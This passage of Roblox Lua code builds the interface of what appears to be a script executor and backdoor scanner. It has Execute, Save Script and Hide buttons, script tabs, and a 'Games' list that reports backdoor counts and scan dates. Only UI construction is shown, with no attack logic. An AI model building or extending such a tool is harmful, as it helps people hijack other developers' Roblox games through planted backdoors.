v0["42"]['ImageColor3'] = Color3.fromRGB(171, 171, 171);
v0["42"]['AnchorPoint'] = Vector2.new(0, 0.5);
v0["42"]['Image'] = [[http://www.roblox.com/asset/?id=6022668885]];
v0["42"]['Size'] = UDim2.new(0, 24, 0, 24);
v0["42"]['Position'] = UDim2.new(0.023000000044703484, 0, 0.5, 0);
v0["42"]['BackgroundTransparency'] = 1;
v0["43"] = Instance.new("TextButton", v0["41"]);
v0["43"]['TextWrapped'] = true;
v0["43"]['Active'] = false;
v0["43"]['ZIndex'] = 2;
v0["43"]['TextSize'] = 18;
v0["43"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["43"]['TextColor3'] = Color3.fromRGB(171, 171, 171);
v0["43"]['Selectable'] = false;
v0["43"]['AnchorPoint'] = Vector2.new(0, 0.5);
v0["43"]['Size'] = UDim2.new(1, -40, 1, 0);
v0["43"]['Name'] = [[TextLabel]];
v0["43"]['Text'] = [[Clear]];
v0["43"]['Font'] = Enum.Font.SourceSans;
v0["43"]['Position'] = UDim2.new(0, 30, 0.5, 0);
v0["43"]['BackgroundTransparency'] = 1;
v0["44"] = Instance.new("TextButton", v0["41"]);
v0["44"]['ZIndex'] = 3;
v0["44"]['TextSize'] = 14;
v0["44"]['TextTransparency'] = 1;
v0["44"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["44"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["44"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["44"]['Name'] = [[Hitbox]];
v0["44"]['Text'] = [[]];
v0["44"]['Font'] = Enum.Font.SourceSans;
v0["44"]['BackgroundTransparency'] = 1;
v0["45"] = Instance.new("LocalScript", v0["41"]);
v0["45"]['Name'] = [[handler]];
v0["46"] = Instance.new("ImageButton", v0["3f"]);
v0["46"]['Active'] = false;
v0["46"]['ZIndex'] = 2;
v0["46"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["46"]['ScaleType'] = Enum.ScaleType.Slice;
v0["46"]['SliceScale'] = 0.029999999329447746;
v0["46"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["46"]['ImageColor3'] = Color3.fromRGB(26, 26, 26);
v0["46"]['Selectable'] = false;
v0["46"]['LayoutOrder'] = 3;
v0["46"]['Image'] = [[rbxassetid://3570695787]];
v0["46"]['Size'] = UDim2.new(0, 107, 0, 24);
v0["46"]['Name'] = [[SaveBtn]];
v0["46"]['Position'] = UDim2.new(0, 0, -1.5833333730697632, 0);
v0["46"]['BackgroundTransparency'] = 1;
v0["47"] = Instance.new("ImageButton", v0["46"]);
v0["47"]['ZIndex'] = 2;
v0["47"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["47"]['ImageColor3'] = Color3.fromRGB(171, 171, 171);
v0["47"]['AnchorPoint'] = Vector2.new(0, 0.5);
v0["47"]['Image'] = [[http://www.roblox.com/asset/?id=6035067857]];
v0["47"]['Size'] = UDim2.new(0, 24, 0, 24);
v0["47"]['Position'] = UDim2.new(0.023000000044703484, 0, 0.5, 0);
v0["47"]['BackgroundTransparency'] = 1;
v0["48"] = Instance.new("TextButton", v0["46"]);
v0["48"]['TextWrapped'] = true;
v0["48"]['Active'] = false;
v0["48"]['ZIndex'] = 2;
v0["48"]['TextSize'] = 18;
v0["48"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["48"]['TextColor3'] = Color3.fromRGB(171, 171, 171);
v0["48"]['Selectable'] = false;
v0["48"]['AnchorPoint'] = Vector2.new(0, 0.5);
v0["48"]['Size'] = UDim2.new(1, -40, 1, 0);
v0["48"]['Name'] = [[TextLabel]];
v0["48"]['Text'] = [[Save Script]];
v0["48"]['Font'] = Enum.Font.SourceSans;
v0["48"]['Position'] = UDim2.new(0, 30, 0.5, 0);
v0["48"]['BackgroundTransparency'] = 1;
v0["49"] = Instance.new("TextButton", v0["46"]);
v0["49"]['ZIndex'] = 3;
v0["49"]['TextSize'] = 14;
v0["49"]['TextTransparency'] = 1;
v0["49"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["49"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["49"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["49"]['Name'] = [[Hitbox]];
v0["49"]['Text'] = [[]];
v0["49"]['Font'] = Enum.Font.SourceSans;
v0["49"]['BackgroundTransparency'] = 1;
v0["4a"] = Instance.new("LocalScript", v0["46"]);
v0["4a"]['Name'] = [[handler]];
v0["4b"] = Instance.new("ImageButton", v0["3f"]);
v0["4b"]['Active'] = false;
v0["4b"]['ZIndex'] = 2;
v0["4b"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["4b"]['ScaleType'] = Enum.ScaleType.Slice;
v0["4b"]['SliceScale'] = 0.029999999329447746;
v0["4b"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["4b"]['ImageColor3'] = Color3.fromRGB(26, 26, 26);
v0["4b"]['Selectable'] = false;
v0["4b"]['LayoutOrder'] = 3;
v0["4b"]['Image'] = [[rbxassetid://3570695787]];
v0["4b"]['Size'] = UDim2.new(0, 107, 0, 24);
v0["4b"]['Name'] = [[HideBtn]];
v0["4b"]['Position'] = UDim2.new(0, 0, -1.5833333730697632, 0);
v0["4b"]['BackgroundTransparency'] = 1;
v0["4c"] = Instance.new("ImageButton", v0["4b"]);
v0["4c"]['ZIndex'] = 2;
v0["4c"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["4c"]['ImageColor3'] = Color3.fromRGB(171, 171, 171);
v0["4c"]['AnchorPoint'] = Vector2.new(0, 0.5);
v0["4c"]['Image'] = [[http://www.roblox.com/asset/?id=6031075929]];
v0["4c"]['Size'] = UDim2.new(0, 24, 0, 24);
v0["4c"]['Position'] = UDim2.new(0.023000000044703484, 0, 0.5, 0);
v0["4c"]['BackgroundTransparency'] = 1;
v0["4d"] = Instance.new("TextButton", v0["4b"]);
v0["4d"]['TextWrapped'] = true;
v0["4d"]['Active'] = false;
v0["4d"]['ZIndex'] = 2;
v0["4d"]['TextSize'] = 18;
v0["4d"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["4d"]['TextColor3'] = Color3.fromRGB(171, 171, 171);
v0["4d"]['Selectable'] = false;
v0["4d"]['AnchorPoint'] = Vector2.new(0, 0.5);
v0["4d"]['Size'] = UDim2.new(1, -40, 1, 0);
v0["4d"]['Name'] = [[TextLabel]];
v0["4d"]['Text'] = [[Hide]];
v0["4d"]['Font'] = Enum.Font.SourceSans;
v0["4d"]['Position'] = UDim2.new(0, 30, 0.5, 0);
v0["4d"]['BackgroundTransparency'] = 1;
v0["4e"] = Instance.new("TextButton", v0["4b"]);
v0["4e"]['ZIndex'] = 3;
v0["4e"]['TextSize'] = 14;
v0["4e"]['TextTransparency'] = 1;
v0["4e"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["4e"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["4e"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["4e"]['Name'] = [[Hitbox]];
v0["4e"]['Text'] = [[]];
v0["4e"]['Font'] = Enum.Font.SourceSans;
v0["4e"]['BackgroundTransparency'] = 1;
v0["4f"] = Instance.new("LocalScript", v0["4b"]);
v0["4f"]['Name'] = [[handler]];
v0["50"] = Instance.new("ImageButton", v0["3f"]);
v0["50"]['ZIndex'] = 2;
v0["50"]['BorderSizePixel'] = 0;
v0["50"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["50"]['ScaleType'] = Enum.ScaleType.Slice;
v0["50"]['Modal'] = true;
v0["50"]['SliceScale'] = 0.029999999329447746;
v0["50"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["50"]['ImageColor3'] = Color3.fromRGB(26, 26, 26);
v0["50"]['Selectable'] = false;
v0["50"]['Image'] = [[rbxassetid://3570695787]];
v0["50"]['Size'] = UDim2.new(0, 107, 0, 24);
v0["50"]['Name'] = [[ExecuteBtn]];
v0["50"]['Position'] = UDim2.new(0, 0, -1.5833333730697632, 0);
v0["50"]['BackgroundTransparency'] = 1;
v0["51"] = Instance.new("ImageButton", v0["50"]);
v0["51"]['ZIndex'] = 2;
v0["51"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["51"]['ImageColor3'] = Color3.fromRGB(171, 171, 171);
v0["51"]['AnchorPoint'] = Vector2.new(0, 0.5);
v0["51"]['Image'] = [[http://www.roblox.com/asset/?id=6026663699]];
v0["51"]['Size'] = UDim2.new(0, 24, 0, 24);
v0["51"]['Position'] = UDim2.new(0.022900763899087906, 0, 0.5, 0);
v0["51"]['BackgroundTransparency'] = 1;
v0["52"] = Instance.new("LocalScript", v0["50"]);
v0["53"] = Instance.new("TextButton", v0["50"]);
v0["53"]['TextWrapped'] = true;
v0["53"]['Active'] = false;
v0["53"]['ZIndex'] = 2;
v0["53"]['TextSize'] = 18;
v0["53"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["53"]['TextColor3'] = Color3.fromRGB(171, 171, 171);
v0["53"]['Selectable'] = false;
v0["53"]['AnchorPoint'] = Vector2.new(0, 0.5);
v0["53"]['Size'] = UDim2.new(1, -40, 1, 0);
v0["53"]['Name'] = [[TextLabel]];
v0["53"]['Text'] = [[Execute]];
v0["53"]['Font'] = Enum.Font.SourceSans;
v0["53"]['Position'] = UDim2.new(0, 30, 0.5, 0);
v0["53"]['BackgroundTransparency'] = 1;
v0["54"] = Instance.new("TextButton", v0["50"]);
v0["54"]['ZIndex'] = 3;
v0["54"]['TextSize'] = 14;
v0["54"]['TextTransparency'] = 1;
v0["54"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["54"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["54"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["54"]['Name'] = [[Hitbox]];
v0["54"]['Text'] = [[]];
v0["54"]['Font'] = Enum.Font.SourceSans;
v0["54"]['BackgroundTransparency'] = 1;
v0["55"] = Instance.new("LocalScript", v0["3f"]);
v0["55"]['Name'] = [[handler]];
v0["56"] = Instance.new("ScrollingFrame", v0["28"]);
v0["56"]['Active'] = true;
v0["56"]['BorderSizePixel'] = 0;
v0["56"]['CanvasSize'] = UDim2.new(0, 0, 0, 0);
v0["56"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["56"]['BackgroundTransparency'] = 1;
v0["56"]['Size'] = UDim2.new(1, -130, 0, 29);
v0["56"]['ScrollBarImageColor3'] = Color3.fromRGB(168, 168, 168);
v0["56"]['ScrollBarThickness'] = 3;
v0["56"]['Position'] = UDim2.new(0, 10, 0, 5);
v0["56"]['Name'] = [[OpenScripts]];
v0["57"] = Instance.new("UIListLayout", v0["56"]);
v0["57"]['VerticalAlignment'] = Enum.VerticalAlignment.Center;
v0["57"]['FillDirection'] = Enum.FillDirection.Horizontal;
v0["57"]['Padding'] = UDim.new(0, 5);
v0["58"] = Instance.new("ImageButton", v0["56"]);
v0["58"]['Active'] = false;
v0["58"]['ZIndex'] = 2;
v0["58"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["58"]['ScaleType'] = Enum.ScaleType.Slice;
v0["58"]['SliceScale'] = 0.029999999329447746;
v0["58"]['BackgroundColor3'] = Color3.fromRGB(26, 26, 26);
v0["58"]['ImageColor3'] = Color3.fromRGB(26, 26, 26);
v0["58"]['Selectable'] = false;
v0["58"]['LayoutOrder'] = 500;
v0["58"]['Image'] = [[rbxassetid://3570695787]];
v0["58"]['Size'] = UDim2.new(0, 24, 0, 22);
v0["58"]['Name'] = [[999]];
v0["58"]['Position'] = UDim2.new(0.1694599688053131, 0, 0, 0);
v0["58"]['BackgroundTransparency'] = 1;
v0["59"] = Instance.new("TextButton", v0["58"]);
v0["59"]['TextWrapped'] = true;
v0["59"]['Active'] = false;
v0["59"]['ZIndex'] = 2;
v0["59"]['TextSize'] = 14;
v0["59"]['TextScaled'] = true;
v0["59"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["59"]['TextColor3'] = Color3.fromRGB(222, 222, 222);
v0["59"]['Selectable'] = false;
v0["59"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["59"]['Name'] = [[Hitbox]];
v0["59"]['Text'] = [[+]];
v0["59"]['Font'] = Enum.Font.SourceSans;
v0["59"]['BackgroundTransparency'] = 1;
v0["5a"] = Instance.new("ImageButton", v0["56"]);
v0["5a"]['Active'] = false;
v0["5a"]['ZIndex'] = 2;
v0["5a"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["5a"]['ScaleType'] = Enum.ScaleType.Slice;
v0["5a"]['SliceScale'] = 0.029999999329447746;
v0["5a"]['BackgroundColor3'] = Color3.fromRGB(26, 26, 26);
v0["5a"]['ImageColor3'] = Color3.fromRGB(26, 26, 26);
v0["5a"]['Selectable'] = false;
v0["5a"]['Image'] = [[rbxassetid://3570695787]];
v0["5a"]['Size'] = UDim2.new(0, 86, 0, 22);
v0["5a"]['Name'] = [[1]];
v0["5a"]['BackgroundTransparency'] = 1;
v0["5b"] = Instance.new("TextButton", v0["5a"]);
v0["5b"]['Active'] = false;
v0["5b"]['ZIndex'] = 2;
v0["5b"]['TextSize'] = 15;
v0["5b"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["5b"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["5b"]['TextColor3'] = Color3.fromRGB(222, 222, 222);
v0["5b"]['Selectable'] = false;
v0["5b"]['Size'] = UDim2.new(0.6395349502563477, 0, 1, 0);
v0["5b"]['Name'] = [[Text]];
v0["5b"]['Text'] = [[Script 1]];
v0["5b"]['Font'] = Enum.Font.SourceSansBold;
v0["5b"]['Position'] = UDim2.new(0.151162788271904, 0, 0, 0);
v0["5b"]['BackgroundTransparency'] = 1;
v0["5c"] = Instance.new("TextButton", v0["5a"]);
v0["5c"]['ZIndex'] = 10;
v0["5c"]['TextSize'] = 16;
v0["5c"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["5c"]['TextColor3'] = Color3.fromRGB(62, 62, 62);
v0["5c"]['AnchorPoint'] = Vector2.new(1, 0.5);
v0["5c"]['Size'] = UDim2.new(0, 20, 0, 20);
v0["5c"]['Name'] = [[X]];
v0["5c"]['Text'] = [[x]];
v0["5c"]['Font'] = Enum.Font.SourceSans;
v0["5c"]['Position'] = UDim2.new(1, 0, 0.5, 0);
v0["5c"]['BackgroundTransparency'] = 1;
v0["5d"] = Instance.new("TextButton", v0["5a"]);
v0["5d"]['ZIndex'] = 3;
v0["5d"]['TextSize'] = 14;
v0["5d"]['TextTransparency'] = 1;
v0["5d"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["5d"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["5d"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["5d"]['Name'] = [[Hitbox]];
v0["5d"]['Text'] = [[]];
v0["5d"]['Font'] = Enum.Font.SourceSans;
v0["5d"]['BackgroundTransparency'] = 1;
v0["5e"] = Instance.new("ImageLabel", v0["23"]);
v0["5e"]['ZIndex'] = 0;
v0["5e"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["5e"]['ScaleType'] = Enum.ScaleType.Slice;
v0["5e"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 0);
v0["5e"]['ImageColor3'] = Color3.fromRGB(0, 0, 0);
v0["5e"]['SliceScale'] = 0.029999999329447746;
v0["5e"]['Visible'] = false;
v0["5e"]['Image'] = [[rbxassetid://3570695787]];
v0["5e"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["5e"]['Name'] = [[Games]];
v0["5e"]['BackgroundTransparency'] = 1;
v0["5e"]['Position'] = UDim2.new(0.00032929747248999774, 0, -0.0029999851249158382, 0);
v0["5f"] = Instance.new("Frame", v0["5e"]);
v0["5f"]['ZIndex'] = 0;
v0["5f"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["5f"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["5f"]['BackgroundTransparency'] = 1;
v0["5f"]['LayoutOrder'] = 5;
v0["5f"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["5f"]['Position'] = UDim2.new(0.5, 0, 0.5, 0);
v0["5f"]['Name'] = [[InnerBody]];
v0["60"] = Instance.new("TextLabel", v0["5f"]);
v0["60"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["60"]['TextSize'] = 23;
v0["60"]['TextColor3'] = Color3.fromRGB(233, 233, 233);
v0["60"]['Size'] = UDim2.new(0, 100, 0, 40);
v0["60"]['Text'] = [[Games]];
v0["60"]['Name'] = [[Title]];
v0["60"]['Font'] = Enum.Font.SourceSansBold;
v0["60"]['BackgroundTransparency'] = 1;
v0["61"] = Instance.new("ScrollingFrame", v0["5f"]);
v0["61"]['Active'] = true;
v0["61"]['BorderSizePixel'] = 0;
v0["61"]['CanvasSize'] = UDim2.new(0, 0, 0, 0);
v0["61"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["61"]['BackgroundTransparency'] = 1;
v0["61"]['Size'] = UDim2.new(1, 0, 1, -40);
v0["61"]['ScrollBarImageColor3'] = Color3.fromRGB(168, 168, 168);
v0["61"]['ScrollBarThickness'] = 5;
v0["61"]['Position'] = UDim2.new(0, 0, 0, 40);
v0["62"] = Instance.new("UIListLayout", v0["61"]);
v0["62"]['HorizontalAlignment'] = Enum.HorizontalAlignment.Center;
v0["62"]['Padding'] = UDim.new(0, 5);
v0["62"]['SortOrder'] = Enum.SortOrder.LayoutOrder;
v0["63"] = Instance.new("Frame", v0["61"]);
v0["63"]['BackgroundColor3'] = Color3.fromRGB(38, 38, 38);
v0["63"]['AnchorPoint'] = Vector2.new(1, 0);
v0["63"]['LayoutOrder'] = 1;
v0["63"]['Size'] = UDim2.new(1, -50, 0, 100);
v0["63"]['Name'] = [[dummy]];
v0["64"] = Instance.new("UICorner", v0["63"]);
v0["65"] = Instance.new("ImageLabel", v0["63"]);
v0["65"]['ScaleType'] = Enum.ScaleType.Crop;
v0["65"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["65"]['Image'] = [[rbxassetid://7007977848]];
v0["65"]['Size'] = UDim2.new(0, 120, 0, 100);
v0["65"]['Name'] = [[GameIcon]];
v0["65"]['BackgroundTransparency'] = 1;
v0["66"] = Instance.new("UICorner", v0["65"]);
v0["67"] = Instance.new("Frame", v0["65"]);
v0["67"]['BorderSizePixel'] = 0;
v0["67"]['BackgroundColor3'] = Color3.fromRGB(38, 38, 38);
v0["67"]['AnchorPoint'] = Vector2.new(1, 0);
v0["67"]['Size'] = UDim2.new(0, 5, 1, 0);
v0["67"]['Position'] = UDim2.new(1, 0, 0, 0);
v0["67"]['Name'] = [[fix]];
v0["68"] = Instance.new("UIGradient", v0["67"]);
v0["68"]['Rotation'] = 90;
v0["68"]['Color'] = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(168, 168, 168)),ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))});
v0["69"] = Instance.new("UIGradient", v0["63"]);
v0["69"]['Rotation'] = 90;
v0["69"]['Color'] = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(168, 168, 168)),ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))});
v0["6a"] = Instance.new("TextLabel", v0["63"]);
v0["6a"]['TextWrapped'] = true;
v0["6a"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["6a"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["6a"]['TextSize'] = 23;
v0["6a"]['TextColor3'] = Color3.fromRGB(233, 233, 233);
v0["6a"]['Size'] = UDim2.new(1, -180, 0, 40);
v0["6a"]['Text'] = [[GameName]];
v0["6a"]['Name'] = [[Title]];
v0["6a"]['Font'] = Enum.Font.SourceSansBold;
v0["6a"]['BackgroundTransparency'] = 1;
v0["6a"]['Position'] = UDim2.new(0, 130, 0, 0);
v0["6b"] = Instance.new("TextLabel", v0["63"]);
v0["6b"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["6b"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["6b"]['TextSize'] = 15;
v0["6b"]['TextColor3'] = Color3.fromRGB(233, 233, 233);
v0["6b"]['Size'] = UDim2.new(0, 100, 0, 20);
v0["6b"]['Text'] = [[- Backdoors: %d]];
v0["6b"]['Name'] = [[Backdoors]];
v0["6b"]['Font'] = Enum.Font.SourceSans;
v0["6b"]['BackgroundTransparency'] = 1;
v0["6b"]['Position'] = UDim2.new(0, 130, 0, 40);
v0["6c"] = Instance.new("TextLabel", v0["63"]);
v0["6c"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["6c"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["6c"]['TextSize'] = 15;
v0["6c"]['TextColor3'] = Color3.fromRGB(233, 233, 233);
v0["6c"]['Size'] = UDim2.new(0, 100, 0, 20);
v0["6c"]['Text'] = [[- Scanned on: %s]];
v0["6c"]['Name'] = [[Date]];
v0["6c"]['Font'] = Enum.Font.SourceSans;
v0["6c"]['BackgroundTransparency'] = 1;
v0["6c"]['Position'] = UDim2.new(0, 130, 0, 60);
v0["6d"] = Instance.new("Frame", v0["63"]);
v0["6d"]['BackgroundColor3'] = Color3.fromRGB(0, 186, 78);
v0["6d"]['AnchorPoint'] = Vector2.new(1, 0);
v0["6d"]['Size'] = UDim2.new(0, 30, 1, 0);
v0["6d"]['Position'] = UDim2.new(1, 0, 0, 0);
v0["6d"]['Name'] = [[Play]];
v0["6e"] = Instance.new("UICorner", v0["6d"]);
v0["6f"] = Instance.new("Frame", v0["6d"]);
v0["6f"]['BorderSizePixel'] = 0;
v0["6f"]['BackgroundColor3'] = Color3.fromRGB(38, 38, 38);
v0["6f"]['Size'] = UDim2.new(0, 5, 1, 0);
v0["6f"]['Name'] = [[fix]];
v0["70"] = Instance.new("UIGradient", v0["6f"]);
v0["70"]['Rotation'] = 90;
v0["70"]['Color'] = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(168, 168, 168)),ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))});
v0["71"] = Instance.new("ImageLabel", v0["6d"]);
v0["71"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["71"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["71"]['Image'] = [[rbxassetid://7008236803]];
v0["71"]['Size'] = UDim2.new(0, 15, 0, 15);
v0["71"]['Name'] = [[Icon]];
v0["71"]['BackgroundTransparency'] = 1;
v0["71"]['Position'] = UDim2.new(0.5, 3, 0.5, 0);
v0["72"] = Instance.new("TextButton", v0["6d"]);
v0["72"]['TextSize'] = 14;
v0["72"]['TextTransparency'] = 1;
v0["72"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["72"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["72"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["72"]['Name'] = [[Hitbox]];
v0["72"]['Text'] = [[]];
v0["72"]['Font'] = Enum.Font.SourceSans;
v0["72"]['BackgroundTransparency'] = 1;
v0["73"] = Instance.new("TextLabel", v0["61"]);
v0["73"]['TextWrapped'] = true;
v0["73"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["73"]['TextSize'] = 18;
v0["73"]['TextColor3'] = Color3.fromRGB(15, 140, 217);
v0["73"]['Size'] = UDim2.new(1, 0, 0, 50);
v0["73"]['Text'] = [[Scan games and save here all successfully scanned ones!]];
v0["73"]['Name'] = [[info]];
v0["73"]['Font'] = Enum.Font.Nunito;
v0["73"]['BackgroundTransparency'] = 1;
v0["74"] = Instance.new("ImageLabel", v0["23"]);
v0["74"]['ZIndex'] = 2;
v0["74"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["74"]['ScaleType'] = Enum.ScaleType.Slice;
v0["74"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 0);
v0["74"]['ImageColor3'] = Color3.fromRGB(0, 0, 0);
v0["74"]['SliceScale'] = 0.029999999329447746;
v0["74"]['Visible'] = false;
v0["74"]['Image'] = [[rbxassetid://3570695787]];
v0["74"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["74"]['Name'] = [[Settings]];
v0["74"]['BackgroundTransparency'] = 1;
v0["74"]['Position'] = UDim2.new(0, 0, -0.003000000026077032, 0);
v0["75"] = Instance.new("Folder", v0["74"]);
v0["75"]['Name'] = [[Borders]];
v0["76"] = Instance.new("Frame", v0["75"]);
v0["76"]['BorderSizePixel'] = 0;
v0["76"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 0);
v0["76"]['Size'] = UDim2.new(0, 9, 0, 313);
v0["76"]['Position'] = UDim2.new(-9.137e-8, 0, 0, 0);
v0["77"] = Instance.new("Frame", v0["75"]);
v0["77"]['BorderSizePixel'] = 0;
v0["77"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 0);
v0["77"]['Size'] = UDim2.new(0, 663, 0, 6);
v0["77"]['Position'] = UDim2.new(-4.5963965e-8, 0, 0, 0);
v0["78"] = Instance.new("Frame", v0["74"]);
v0["78"]['ZIndex'] = 2;
v0["78"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["78"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["78"]['BackgroundTransparency'] = 1;
v0["78"]['LayoutOrder'] = 5;
v0["78"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["78"]['Position'] = UDim2.new(0.5, 0, 0.5, 0);
v0["78"]['Name'] = [[InnerBody]];
v0["79"] = Instance.new("TextLabel", v0["78"]);
v0["79"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["79"]['TextSize'] = 23;
v0["79"]['TextColor3'] = Color3.fromRGB(233, 233, 233);
v0["79"]['Size'] = UDim2.new(0, 100, 0, 40);
v0["79"]['Text'] = [[Settings]];
v0["79"]['Name'] = [[Title]];
v0["79"]['Font'] = Enum.Font.SourceSansBold;
v0["79"]['BackgroundTransparency'] = 1;
v0["7a"] = Instance.new("ScrollingFrame", v0["78"]);
v0["7a"]['Active'] = true;
v0["7a"]['BorderSizePixel'] = 0;
v0["7a"]['CanvasSize'] = UDim2.new(0, 0, 0, 0);
v0["7a"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["7a"]['BackgroundTransparency'] = 1;
v0["7a"]['Size'] = UDim2.new(1, 0, 1, -43);
v0["7a"]['ScrollBarImageColor3'] = Color3.fromRGB(168, 168, 168);
v0["7a"]['ScrollBarThickness'] = 5;
v0["7a"]['Position'] = UDim2.new(0, 0, 0, 43);
v0["7b"] = Instance.new("UIListLayout", v0["7a"]);
v0["7b"]['HorizontalAlignment'] = Enum.HorizontalAlignment.Center;
v0["7b"]['Padding'] = UDim.new(0, 5);
v0["7b"]['SortOrder'] = Enum.SortOrder.LayoutOrder;
v0["7c"] = Instance.new("Frame", v0["7a"]);
v0["7c"]['BackgroundColor3'] = Color3.fromRGB(38, 38, 38);
v0["7c"]['AnchorPoint'] = Vector2.new(1, 0);
v0["7c"]['BackgroundTransparency'] = 1;
v0["7c"]['Size'] = UDim2.new(1, -50, 0, 25);
v0["7c"]['Name'] = [[dummy]];
v0["7d"] = Instance.new("UICorner", v0["7c"]);
v0["7e"] = Instance.new("TextLabel", v0["7c"]);
v0["7e"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["7e"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["7e"]['TextSize'] = 18;
v0["7e"]['TextColor3'] = Color3.fromRGB(233, 233, 233);
v0["7e"]['AnchorPoint'] = Vector2.new(0, 0.5);
v0["7e"]['Size'] = UDim2.new(0, 100, 1, 0);
v0["7e"]['Text'] = [[Name]];
v0["7e"]['Name'] = [[Title]];
v0["7e"]['Font'] = Enum.Font.SourceSans;
v0["7e"]['BackgroundTransparency'] = 1;
v0["7e"]['Position'] = UDim2.new(0, 0, 0.5, 0);
v0["7f"] = Instance.new("LocalScript", v0["74"]);
v0["7f"]['Name'] = [[handler]];
v0["80"] = Instance.new("LocalScript", v0["2"]);
v0["80"]['Name'] = [[drag]];
v0["81"] = Instance.new("TextButton", v0["2"]);
v0["81"]['Active'] = false;
v0["81"]['TextSize'] = 14;
v0["81"]['TextTransparency'] = 1;
v0["81"]['BackgroundColor3'] = Color3.fromRGB(199, 199, 199);
v0["81"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["81"]['AnchorPoint'] = Vector2.new(1, 1);
v0["81"]['Size'] = UDim2.new(0, 10, 0, 10);
v0["81"]['Name'] = [[Resize]];
v0["81"]['Font'] = Enum.Font.SourceSans;
v0["81"]['Position'] = UDim2.new(1, 0, 1, 0);
v0["82"] = Instance.new("UICorner", v0["81"]);
v0["82"]['CornerRadius'] = UDim.new(0, 2);
v0["83"] = Instance.new("LocalScript", v0["81"]);
v0["83"]['Name'] = [[handler]];
v0["84"] = Instance.new("TextButton", v0["2"]);
v0["84"]['ZIndex'] = 3;
v0["84"]['BorderSizePixel'] = 0;
v0["84"]['AutoButtonColor'] = false;
v0["84"]['TextSize'] = 14;
v0["84"]['TextTransparency'] = 1;
v0["84"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 0);
v0["84"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["84"]['Visible'] = false;
v0["84"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["84"]['Size'] = UDim2.new(0, 190, 0, 130);
v0["84"]['Name'] = [[SavePopup]];
v0["84"]['BorderColor3'] = Color3.fromRGB(0, 0, 0);
